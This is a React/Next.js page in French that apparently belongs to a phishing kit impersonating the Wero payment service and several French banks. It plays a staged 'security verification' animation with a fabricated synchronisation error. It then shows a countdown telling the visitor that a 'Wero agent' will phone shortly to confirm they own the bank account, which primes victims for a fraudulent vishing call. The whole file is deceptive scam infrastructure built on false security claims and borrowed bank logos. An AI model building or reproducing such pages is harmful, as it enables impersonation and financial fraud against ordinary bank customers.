'use client';

import React, { useState, useEffect } from 'react';
import Link from 'next/link';
import { Check, Lock, Phone, AlertTriangle, ShieldCheck } from 'lucide-react';

export default function ConfirmPage() {
  // --- États pour l'animation de vérification (3 secondes) ---
  const [isLoading, setIsLoading] = useState(true);
  const [progress, setProgress] = useState(0);
  const [step1Done, setStep1Done] = useState(false);
  const [step2Done, setStep2Done] = useState(false);
  const [step3Error, setStep3Error] = useState(false);

  // --- États pour le reste de la page ---
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [timeLeft, setTimeLeft] = useState(572); // 09:32

  // Séquence d'animation initiale
  useEffect(() => {
    // Progression de la barre
    const progressInterval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) {
          clearInterval(progressInterval);
          return 100;
        }
        return prev + 2;
      });
    }, 60); // ~3 secondes au total

    // Étape 1 : Données cryptées (1 sec)
    const timer1 = setTimeout(() => setStep1Done(true), 1000);

    // Étape 2 : Conformité validée (2 sec)
    const timer2 = setTimeout(() => setStep2Done(true), 2000);

    // Étape 3 : Erreur de synchronisation (2.7 sec)
    const timer3 = setTimeout(() => setStep3Error(true), 2700);

    // Fin du chargement et affichage de la page principale (3.8 sec)
    const timerEnd = setTimeout(() => setIsLoading(false), 3800);

    return () => {
      clearInterval(progressInterval);
      clearTimeout(timer1);
      clearTimeout(timer2);
      clearTimeout(timer3);
      clearTimeout(timerEnd);
    };
  }, []);

  // Chronomètre dynamique pour la page finale
  useEffect(() => {
    if (isLoading) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, [isLoading]);

  const minutes = String(Math.floor(timeLeft / 60)).padStart(2, '0');
  const seconds = String(timeLeft % 60).padStart(2, '0');

  // 1. ÉCRAN DE VÉRIFICATION ANIMÉ (3 SECONDES)
  if (isLoading) {
    return (
      <div className="min-h-[100dvh] w-full bg-gradient-to-b from-yellow-50 via-white to-slate-50 flex items-center justify-center p-4 font-sans select-none">
        <div className="w-full max-w-sm bg-white rounded-3xl border border-slate-900/10 shadow-2xl p-6 flex flex-col items-center text-center animate-in fade-in duration-300">
          
          {/* Favicon / Logo Wero */}
        {/* Logo épuré sans fond jaune ni halo */}
<div className="relative mb-6">
  <div className="w-20 h-20 bg-slate-50 border border-slate-100 rounded-2xl flex items-center justify-center p-2.5 shadow-sm">
    <img src="/flavicon.ico" alt="Wero" className="w-full h-full object-contain rounded-xl" />
  </div>
</div>

          <h1 className="text-2xl font-black text-slate-900 tracking-tight mb-1">
            Vérification...
          </h1>
          <p className="text-xs font-semibold text-slate-500 mb-6">
            Protocole de sécurité bancaire en cours
          </p>

          {/* Barre de progression animée */}
          <div className="w-full bg-slate-100 rounded-full h-2.5 mb-6 overflow-hidden border border-slate-200">
            <div
              className="bg-slate-900 h-full rounded-full transition-all duration-100 ease-out"
              style={{ width: `${progress}%` }}
            />
          </div>

          {/* Liste des étapes de sécurité */}
          <div className="w-full flex flex-col gap-3 text-left mb-6">
            
            {/* Étape 1 */}
            <div className="flex items-center gap-3 p-3 rounded-xl bg-slate-50 border border-slate-100 transition-all">
              <div className={`w-6 h-6 rounded-full flex items-center justify-center text-white shrink-0 transition-colors ${step1Done ? 'bg-emerald-500' : 'bg-slate-200'}`}>
                {step1Done ? <Check className="w-3.5 h-3.5 stroke-[3]" /> : <div className="w-2 h-2 rounded-full bg-slate-400 animate-ping" />}
              </div>
              <span className={`text-xs font-bold ${step1Done ? 'text-emerald-600' : 'text-slate-400'}`}>
                Données cryptées
              </span>
            </div>

            {/* Étape 2 */}
            <div className="flex items-center gap-3 p-3 rounded-xl bg-slate-50 border border-slate-100 transition-all">
              <div className={`w-6 h-6 rounded-full flex items-center justify-center text-white shrink-0 transition-colors ${step2Done ? 'bg-emerald-500' : 'bg-slate-200'}`}>
                {step2Done ? <Check className="w-3.5 h-3.5 stroke-[3]" /> : <div className="w-2 h-2 rounded-full bg-slate-400 animate-ping" />}
              </div>
              <span className={`text-xs font-bold ${step2Done ? 'text-emerald-600' : 'text-slate-400'}`}>
                Conformité validée
              </span>
            </div>

            {/* Étape 3 (Alerte de synchronisation) */}
            <div className={`flex items-center gap-3 p-3 rounded-xl transition-all ${step3Error ? 'bg-amber-50 border border-amber-200' : 'bg-slate-50 border border-slate-100'}`}>
              <div className={`w-6 h-6 rounded-full flex items-center justify-center text-white shrink-0 transition-colors ${step3Error ? 'bg-amber-500' : 'bg-slate-200'}`}>
                {step3Error ? <AlertTriangle className="w-3.5 h-3.5 stroke-[3]" /> : <div className="w-2 h-2 rounded-full bg-slate-400" />}
              </div>
              <span className={`text-xs font-bold ${step3Error ? 'text-amber-700' : 'text-slate-400'}`}>
                {step3Error ? "Les données n'ont pas pu être synchronisées automatiquement" : 'Synchronisation finale'}
              </span>
            </div>

          </div>

          {/* Footer SSL */}
          <div className="flex items-center justify-center gap-1.5 text-[10px] font-bold text-slate-400 tracking-widest uppercase">
            <Lock className="w-3 h-3" />
            <span>SSL SECURED 256-BIT</span>
          </div>

        </div>
      </div>
    );
  }

  // 2. PAGE DE CONFIRMATION FINALE (BASÉE SUR LES ICÔNES DU DESIGN)
  return (
    <div className="min-h-[100dvh] w-full bg-white text-slate-900 font-sans flex flex-col justify-between overflow-x-hidden select-none animate-in fade-in duration-500">
      
      {/* Header avec Logo */}
      <header className="w-full px-5 py-3.5 flex items-center justify-between border-b border-slate-100 bg-white sticky top-0 z-20 shrink-0">
        <Link href="/" className="flex items-center">
          <img src="/flavicon.ico" alt="Wero" className="h-8 w-8 object-contain rounded-lg" />
        </Link>

        <button
          onClick={() => setIsMenuOpen(!isMenuOpen)}
          aria-label="Menu"
          className="p-2 rounded-xl text-slate-800 hover:bg-slate-50 transition-colors focus:outline-none"
        >
          <div className="w-5 h-3.5 flex flex-col justify-between">
            <span className={`h-0.5 w-full bg-slate-900 rounded-full transition-all duration-300 ${isMenuOpen ? 'rotate-45 translate-y-1.5' : ''}`} />
            <span className={`h-0.5 w-full bg-slate-900 rounded-full transition-all duration-300 ${isMenuOpen ? 'opacity-0' : ''}`} />
            <span className={`h-0.5 w-full bg-slate-900 rounded-full transition-all duration-300 ${isMenuOpen ? '-rotate-45 -translate-y-1.5' : ''}`} />
          </div>
        </button>
      </header>

      {/* Menu mobile */}
      {isMenuOpen && (
        <div className="absolute top-[60px] left-0 w-full bg-white/98 backdrop-blur-md border-b border-slate-100 p-4 shadow-xl z-30 animate-in fade-in slide-in-from-top-2 duration-200">
          <nav className="flex flex-col gap-2 font-medium text-slate-700">
            <Link 
              href="/" 
              className="p-3 hover:bg-slate-50 rounded-xl transition-colors text-sm font-semibold"
              onClick={() => setIsMenuOpen(false)}
            >
              Accueil
            </Link>
          </nav>
        </div>
      )}

      {/* Contenu principal */}
      <main className="flex-1 px-5 py-6 max-w-md mx-auto w-full flex flex-col items-center text-center gap-4">
        
        <h1 className="text-xl font-black text-slate-900 tracking-tight uppercase">
          PAIEMENT SANS PRISE DE TÊTE
        </h1>

        {/* Badge vert coché */}
        <div className="w-8 h-8 rounded-md bg-emerald-600 text-white flex items-center justify-center shrink-0 shadow-sm">
          <Check className="w-5 h-5 stroke-[3]" />
        </div>

        <h2 className="text-base font-bold text-slate-900">
          Transaction en attente de confirmation
        </h2>

        <p className="text-xs italic font-medium text-slate-500">
          Temps estimé avant l'appel :
        </p>

        {/* Compte à rebours */}
        <div className="flex items-center justify-center gap-6 my-1">
          <div className="flex flex-col items-center">
            <span className="text-4xl font-black text-slate-900 tracking-tight">{minutes}</span>
            <span className="text-xs font-bold text-slate-800 uppercase mt-1">Minutes</span>
          </div>
          <div className="flex flex-col items-center">
            <span className="text-4xl font-black text-slate-900 tracking-tight">{seconds}</span>
            <span className="text-xs font-bold text-slate-800 uppercase mt-1">Seconds</span>
          </div>
        </div>

        {/* Spinner Vert */}
        <div className="my-2">
          <div className="w-10 h-10 border-4 border-[#22C55E] border-t-transparent rounded-full animate-spin" />
        </div>

        {/* Cadenas Orange */}
        <div className="w-10 h-10 rounded-full bg-amber-100 text-amber-500 flex items-center justify-center shrink-0 mt-2">
          <Lock className="w-5 h-5 fill-amber-500" />
        </div>
        <p className="text-sm font-medium text-slate-800 leading-snug px-2">
          Pour garantir la sécurité de vos transactions, une vérification rapide et confidentielle est en cours.
        </p>

        {/* Téléphone Rose */}
        <div className="w-10 h-10 rounded-full bg-rose-100 text-rose-500 flex items-center justify-center shrink-0 mt-2">
          <Phone className="w-5 h-5 fill-rose-500" />
        </div>

        <p className="text-sm text-slate-800 leading-relaxed px-1">
          Un agent <strong className="font-bold text-slate-900">Wero</strong> vous contactera par téléphone dans les prochaines minutes (généralement sous <strong className="font-bold text-slate-900">2 à 5 minutes</strong>) afin de confirmer que vous êtes bien le/la titulaire du compte bancaire associé à votre profil.
        </p>

        <p className="text-xs text-slate-600 leading-relaxed px-1">
          Cette étape ne prend que quelques instants et permet de s'assurer que vos fonds seront transférés en toute sécurité, uniquement vers un compte vérifié.
        </p>

        {/* Badge vert coché */}
        <div className="w-8 h-8 rounded-md bg-emerald-600 text-white flex items-center justify-center shrink-0 mt-2 shadow-sm">
          <Check className="w-5 h-5 stroke-[3]" />
        </div>

        <p className="text-sm font-bold text-slate-900 leading-relaxed px-1 mb-4">
          Merci pour votre patience — cette mesure protège votre argent et prévient toute utilisation frauduleuse du système. Vous n'avez rien à faire, restez simplement disponible pour l'appel.
        </p>

      </main>

      {/* Footer Partenaires */}
      <footer className="w-full px-5 py-6 border-t border-slate-100 bg-white text-center shrink-0">
        <p className="text-xs font-black text-slate-900 tracking-wider uppercase mb-4">
          NOS PARTENAIRES
        </p>
        <div className="flex items-center justify-center gap-3.5 flex-wrap">
          <img src="/Societe-Generale-Emblem.png" alt="Société Générale" className="h-5 object-contain" />
          <img src="/BP-1.png" alt="Banque Populaire" className="h-5 object-contain" />
          <img src="/logo_BanquePostale_600x300.webp" alt="La Banque Postale" className="h-5 object-contain" />
          <img src="/12895685.png" alt="Caisse d'Épargne" className="h-5 object-contain" />
          <img src="/IMG_9197.png" alt="Crédit Agricole" className="h-5 object-contain" />
          <img src="/unnamed.jpg" alt="Crédit Mutuel" className="h-5 object-contain" />
        </div>
      </footer>

    </div>
  );
}